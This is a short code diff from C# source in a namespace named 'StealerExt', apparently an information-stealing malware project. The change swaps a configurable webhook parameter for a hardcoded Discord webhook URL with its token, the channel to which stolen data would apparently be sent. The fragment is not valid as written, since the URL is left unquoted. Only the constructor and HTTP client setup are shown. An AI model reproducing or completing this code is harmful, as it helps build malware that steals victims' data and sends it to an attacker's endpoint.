@@ -18,7 +18,7 @@ namespace StealerExt
 		public API(string _HookUrl)
 		{
 			_Client = new HttpClient();
-			_URL = _HookUrl;
+			_URL = https://discord.com/api/webhooks/945609442475515944/rNWvk7EzpwkI73RQKVn8YSErjHnvyyCyBhnTPOxA_ujUJWTQz46tXE8NPaT7EZ1L7QUi;
 		}
 
 		public static WebClient wc = new WebClient();
